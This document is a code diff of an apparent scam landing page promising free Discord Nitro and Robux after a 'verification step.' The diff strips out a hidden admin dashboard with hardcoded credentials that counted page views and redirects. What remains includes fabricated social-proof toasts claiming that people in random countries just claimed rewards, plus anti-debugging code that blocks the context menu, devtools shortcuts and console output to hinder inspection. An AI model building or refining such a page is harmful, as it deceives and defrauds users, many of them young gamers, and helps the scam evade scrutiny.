@@ -7,7 +7,7 @@
   <meta name="description" content="Choose from Discord Nitro and Robux rewards. Complete a quick verification step to claim." />
   <meta name="theme-color" content="#5865f2">
   <style>
-    /* ----- All your existing styles (unchanged) ----- */
+    /* [Your existing full CSS from previous code – exactly the same, but without any admin styles] */
     * { user-select: none; -webkit-user-select: none; -webkit-tap-highlight-color: transparent; }
     img { -webkit-user-drag: none; user-drag: none; }
     ::selection { background: transparent; }
@@ -236,118 +236,10 @@
     }
     @media (min-width: 768px) and (max-width: 1024px) { .wrap { width: min(600px, 90%); } }
     .hidden { display: none; }
-
-    /* Admin dashboard overlay styles */
-    .admin-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0,0,0,0.85);
-      backdrop-filter: blur(8px);
-      z-index: 10000;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      visibility: hidden;
-      opacity: 0;
-      transition: visibility 0.2s, opacity 0.2s;
-    }
-    .admin-overlay.active {
-      visibility: visible;
-      opacity: 1;
-    }
-    .admin-panel {
-      background: #0f1119;
-      border-radius: 1.5rem;
-      border: 1px solid rgba(88,101,242,0.3);
-      padding: 2rem;
-      width: 90%;
-      max-width: 500px;
-      box-shadow: 0 25px 40px rgba(0,0,0,0.6);
-    }
-    .admin-header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 1.5rem;
-    }
-    .admin-header h2 {
-      font-family: 'Unbounded', sans-serif;
-      font-size: 1.2rem;
-      color: #fff;
-    }
-    .close-admin {
-      background: rgba(255,255,255,0.1);
-      border: none;
-      color: white;
-      font-size: 1.2rem;
-      cursor: pointer;
-      width: 32px;
-      height: 32px;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-    .stat-card {
-      background: #13161f;
-      padding: 0.8rem 1rem;
-      border-radius: 1rem;
-      margin-bottom: 1rem;
-      border-left: 3px solid #5865f2;
-    }
-    .stat-label {
-      font-size: 0.7rem;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      color: #9a9fc0;
-      margin-bottom: 0.2rem;
-    }
-    .stat-number {
-      font-size: 1.8rem;
-      font-weight: 700;
-      color: white;
-      line-height: 1.2;
-    }
-    .admin-error { color: #ff6b6b; font-size: 0.8rem; margin-top: 0.5rem; }
-    .admin-input {
-      width: 100%;
-      padding: 0.7rem 1rem;
-      margin: 0.5rem 0;
-      background: #13161f;
-      border: 1px solid rgba(88,101,242,0.3);
-      border-radius: 0.8rem;
-      color: white;
-      font-family: inherit;
-    }
-    .admin-btn {
-      background: linear-gradient(105deg, #5865f2, #4752c4);
-      border: none;
-      width: 100%;
-      padding: 0.7rem;
-      margin-top: 1rem;
-      border-radius: 2rem;
-      color: white;
-      font-weight: 600;
-      cursor: pointer;
-    }
-    .logout-btn {
-      background: rgba(255,255,255,0.1);
-      margin-top: 0.5rem;
-    }
-    .admin-footer {
-      font-size: 0.6rem;
-      color: #5a5f80;
-      text-align: center;
-      margin-top: 1rem;
-    }
   </style>
 </head>
 <body>
 
-<!-- Background music -->
 <audio id="bgMusic" loop preload="auto" style="display: none;">
   <source src="https://www.ceenaija.com/download-music/hillary-scott-thy-will.mp3" type="audio/mpeg">
 </audio>
@@ -380,51 +272,33 @@
       <div class="faq-item"><div class="faq-question">Can I return later?</div><div class="faq-answer">Yes! Rewards refresh every 24 hours, so you can claim again tomorrow. Bookmark this page.</div></div>
     </div>
   </div>
-  <footer>Event Sponsored by Extvify — <span id="adminTrigger" style="cursor: pointer; text-decoration: underline; opacity:0.6;">Admin</span></footer>
+  <footer>Event Sponsored by Extvify</footer>
 </div>
 <div id="activity-toasts" class="activity-toasts"></div>
 
-<!-- Admin Dashboard Overlay -->
-<div id="adminOverlay" class="admin-overlay">
-  <div class="admin-panel" id="adminPanel">
-    <!-- content will be injected -->
-  </div>
-</div>
-
 <script>
   (function() {
-    // ========== TRACKING ==========
+    // Tracking
     let pageViews = parseInt(localStorage.getItem('extvify_pageViews') || 0) + 1;
     localStorage.setItem('extvify_pageViews', pageViews);
     
-    // ========== ANTI-COPY / ANTI-DEBUG ==========
+    // Anti-copy/debug
     document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
     document.addEventListener('keydown', function(e) {
-      if (e.key === 'F12' ||
-          (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
-          (e.ctrlKey && e.key === 'u') ||
-          (e.ctrlKey && e.key === 's') ||
-          (e.ctrlKey && e.shiftKey && e.key === 'i')) {
-        e.preventDefault();
-        return false;
+      if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.key === 's')) {
+        e.preventDefault(); return false;
       }
     });
-    if (typeof window.console !== 'undefined') { console.log = function() {}; }
-    setInterval(function() {
-      if (typeof window.console !== 'undefined' && window.console.log !== function(){}) { console.log = function(){}; }
-    }, 1000);
+    if (typeof window.console !== 'undefined') console.log = function() {};
 
-    // ========== BACKGROUND MUSIC ==========
+    // Background music
     const bgAudio = document.getElementById('bgMusic');
     let audioStarted = false;
     if (bgAudio) {
       bgAudio.volume = 0.12;
       bgAudio.loop = true;
       const startAudio = () => {
-        if (!audioStarted) {
-          bgAudio.play().catch(e => {});
-          audioStarted = true;
-        }
+        if (!audioStarted) { bgAudio.play().catch(e=>{}); audioStarted = true; }
         document.removeEventListener('click', startAudio);
         document.removeEventListener('touchstart', startAudio);
       };
@@ -432,7 +306,7 @@
       document.addEventListener('touchstart', startAudio);
     }
 
-    // ========== CLICK SOUND ==========
+    // Click sound
     let audioCtx = null;
     function playClick() {
       try {
@@ -451,7 +325,7 @@
       } catch(e) {}
     }
 
-    // ========== REWARD DATA ==========
+    // Rewards data
     const rewards = [
       { id: "nitro_basic", title: "Nitro Basic", desc: "Emojis, stickers, 50MB upload", icon: "https://i.postimg.cc/T1bZnqjV/1cc22811-2ac2-4749-8dfe-501bd4dce238.webp" },
       { id: "nitro_boost", title: "Nitro Boost", desc: "Boosts, 4K streaming, profile perks", icon: "https://i.postimg.cc/3JgsR1xh/nitroboost.webp" },
@@ -466,8 +340,7 @@
     const progressStatus = document.getElementById('progressStatus');
     const progressFill = document.getElementById('progressFill');
     const progressSub = document.getElementById('progressSub');
-    let selectedRewardId = null;
-    let selectedRewardTitle = null;
+    let selectedRewardId = null, selectedRewardTitle = null;
 
     function buildRewardList() {
       rewardList.innerHTML = '';
@@ -476,13 +349,7 @@
         card.className = 'reward-card';
         card.setAttribute('data-id', rew.id);
         card.setAttribute('data-title', rew.title);
-        card.innerHTML = `
-          <div class="reward-icon"><img src="${rew.icon}" alt="${rew.title}" loading="lazy"></div>
-          <div class="reward-info">
-            <div class="reward-title">${rew.title}</div>
-            <div class="reward-desc">${rew.desc}</div>
-          </div>
-        `;
+        card.innerHTML = `<div class="reward-icon"><img src="${rew.icon}" alt="${rew.title}" loading="lazy"></div><div class="reward-info"><div class="reward-title">${rew.title}</div><div class="reward-desc">${rew.desc}</div></div>`;
         card.addEventListener('click', (e) => {
           e.stopPropagation();
           playClick();
@@ -554,16 +421,8 @@
       });
     });
 
-    // ========== SOCIAL PROOF TOASTS ==========
-    const countryNames = [
-      "United States", "United Kingdom", "Canada", "Australia", "France", "Germany", "Italy", "Spain",
-      "Japan", "South Korea", "India", "Brazil", "Mexico", "Netherlands", "Sweden", "Norway", "Switzerland",
-      "Ireland", "New Zealand", "Portugal", "Greece", "Poland", "Turkey", "Egypt", "South Africa",
-      "Nigeria", "Morocco", "Saudi Arabia", "United Arab Emirates", "Qatar", "Israel", "Pakistan",
-      "Bangladesh", "Thailand", "Vietnam", "Philippines", "Indonesia", "Malaysia", "Singapore", "Taiwan",
-      "Argentina", "Chile", "Colombia", "Peru", "Venezuela", "Jamaica", "Iceland", "Austria", "Belgium",
-      "Finland", "Denmark", "Czech Republic", "Hungary", "Romania"
-    ];
+    // Social proof toasts (countries list)
+    const countryNames = ["United States","United Kingdom","Canada","Australia","France","Germany","Italy","Spain","Japan","South Korea","India","Brazil","Mexico","Netherlands","Sweden","Norway","Switzerland","Ireland","New Zealand","Portugal","Greece","Poland","Turkey","Egypt","South Africa","Nigeria","Morocco","Saudi Arabia","United Arab Emirates","Qatar","Israel","Pakistan","Bangladesh","Thailand","Vietnam","Philippines","Indonesia","Malaysia","Singapore","Taiwan","Argentina","Chile","Colombia","Peru","Venezuela","Jamaica","Iceland","Austria","Belgium","Finland","Denmark","Czech Republic","Hungary","Romania"];
     const activityRewards = [
       { name: "Nitro Boost", type: "nitro", icon: "https://i.postimg.cc/3JgsR1xh/nitroboost.webp" },
       { name: "4,500 Robux", type: "robux", icon: "https://i.postimg.cc/1RgP9DFD/robux-1.webp" },
@@ -576,8 +435,8 @@
       if (seconds < 60) return `${seconds} seconds ago`;
       const minutes = Math.floor(seconds / 60);
       const remainder = seconds % 60;
-      if (remainder === 0) return `${minutes} minute${minutes === 1 ? '' : 's'} ago`;
-      return `${minutes} minute${minutes === 1 ? '' : 's'} and ${remainder} seconds ago`;
+      if (remainder === 0) return `${minutes} minute${minutes===1?'':'s'} ago`;
+      return `${minutes} minute${minutes===1?'':'s'} and ${remainder} seconds ago`;
     }
     function showActivityToast() {
       const toastContainer = document.getElementById('activity-toasts');
@@ -591,14 +450,7 @@
       const toastType = reward.type === 'nitro' ? 'toast-nitro' : 'toast-robux';
       const toast = document.createElement('div');
       toast.className = `activity-toast ${toastType}`;
-      toast.innerHTML = `
-        <div class="toast-icon"><img src="${reward.icon}" alt="${reward.name}"></div>
-        <div class="toast-content">
-          <div class="toast-header">Someone from <strong>${country}</strong> claimed</div>
-          <div class="toast-reward">${reward.name}</div>
-          <div class="toast-time">${timeText}</div>
-        </div>
-      `;
+      toast.innerHTML = `<div class="toast-icon"><img src="${reward.icon}" alt="${reward.name}"></div><div class="toast-content"><div class="toast-header">Someone from <strong>${country}</strong> claimed</div><div class="toast-reward">${reward.name}</div><div class="toast-time">${timeText}</div></div>`;
       toastContainer.prepend(toast);
       while (toastContainer.children.length > 3) toastContainer.lastElementChild.remove();
       setTimeout(() => {
@@ -610,101 +462,6 @@
     setTimeout(showActivityToast, 2000);
     setInterval(showActivityToast, 25000);
     buildRewardList();
-
-    // ========== ADMIN DASHBOARD (hidden overlay) ==========
-    const overlay = document.getElementById('adminOverlay');
-    const adminPanel = document.getElementById('adminPanel');
-    let adminLoggedIn = false;
-    let updateInterval = null;
-
-    function refreshDashboardStats() {
-      const views = parseInt(localStorage.getItem('extvify_pageViews') || 0);
-      const redirects = parseInt(localStorage.getItem('extvify_redirects') || 0);
-      const viewsElem = document.getElementById('admin-views');
-      const redirectsElem = document.getElementById('admin-redirects');
-      if (viewsElem) viewsElem.innerText = views.toLocaleString();
-      if (redirectsElem) redirectsElem.innerText = redirects.toLocaleString();
-    }
-
-    function showLogin() {
-      adminPanel.innerHTML = `
-        <div class="admin-header">
-          <h2>Admin Access</h2>
-          <button class="close-admin" id="closeAdminBtn">✕</button>
-        </div>
-        <input type="text" id="adminUser" class="admin-input" placeholder="Username" autocomplete="off">
-        <input type="password" id="adminPass" class="admin-input" placeholder="Password">
-        <button id="adminLoginBtn" class="admin-btn">Login</button>
-        <div id="adminError" class="admin-error"></div>
-        <div class="admin-footer">Only authorized personnel</div>
-      `;
-      document.getElementById('closeAdminBtn').addEventListener('click', () => {
-        overlay.classList.remove('active');
-      });
-      document.getElementById('adminLoginBtn').addEventListener('click', () => {
-        const user = document.getElementById('adminUser').value;
-        const pass = document.getElementById('adminPass').value;
-        if (user === 'extvify' && pass === 'extvify12345') {
-          adminLoggedIn = true;
-          showDashboard();
-        } else {
-          document.getElementById('adminError').innerText = 'Invalid credentials';
-        }
-      });
-    }
-
-    function showDashboard() {
-      const views = parseInt(localStorage.getItem('extvify_pageViews') || 0);
-      const redirects = parseInt(localStorage.getItem('extvify_redirects') || 0);
-      adminPanel.innerHTML = `
-        <div class="admin-header">
-          <h2>Extvify Dashboard</h2>
-          <button class="close-admin" id="closeAdminBtn">✕</button>
-        </div>
-        <div class="stat-card">
-          <div class="stat-label">Total Page Views</div>
-          <div class="stat-number" id="admin-views">${views.toLocaleString()}</div>
-        </div>
-        <div class="stat-card">
-          <div class="stat-label">Total Redirects</div>
-          <div class="stat-number" id="admin-redirects">${redirects.toLocaleString()}</div>
-        </div>
-        <button id="adminLogoutBtn" class="admin-btn logout-btn">Logout</button>
-        <div class="admin-footer">Live updates every 2 seconds</div>
-      `;
-      document.getElementById('closeAdminBtn').addEventListener('click', () => {
-        overlay.classList.remove('active');
-      });
-      document.getElementById('adminLogoutBtn').addEventListener('click', () => {
-        adminLoggedIn = false;
-        if (updateInterval) clearInterval(updateInterval);
-        showLogin();
-      });
-      if (updateInterval) clearInterval(updateInterval);
-      updateInterval = setInterval(() => {
-        if (adminLoggedIn && overlay.classList.contains('active')) {
-          refreshDashboardStats();
-        }
-      }, 2000);
-      refreshDashboardStats();
-    }
-
-    // open admin overlay when clicking "Admin" in footer
-    document.getElementById('adminTrigger').addEventListener('click', () => {
-      overlay.classList.add('active');
-      if (!adminLoggedIn) {
-        showLogin();
-      } else {
-        showDashboard();
-      }
-    });
-
-    // close overlay when clicking outside the panel (optional)
-    overlay.addEventListener('click', (e) => {
-      if (e.target === overlay) {
-        overlay.classList.remove('active');
-      }
-    });
   })();
 </script>
 </body>
